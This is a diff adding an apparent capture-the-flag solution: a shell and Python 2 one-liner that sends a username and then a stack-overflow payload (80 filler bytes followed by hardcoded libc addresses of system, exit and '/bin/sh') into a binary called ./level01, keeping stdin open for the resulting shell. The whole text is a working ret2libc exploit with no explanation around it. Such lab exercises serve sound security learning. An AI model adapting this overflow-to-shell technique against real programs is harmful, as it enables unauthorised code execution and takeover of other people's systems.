@@ -1,0 +1,10 @@
+( python2 - <<'PY'
+import sys, struct
+sys.stdout.write("dat_wil\n")
+payload = "A"*80
+payload += struct.pack("<I", 0xf7e6aed0)  # system
+payload += struct.pack("<I", 0xf7e5eb70)  # exit
+payload += struct.pack("<I", 0xf7f897ec)  # "/bin/sh"
+sys.stdout.write(payload + "\n")
+PY
+cat ) | ./level01
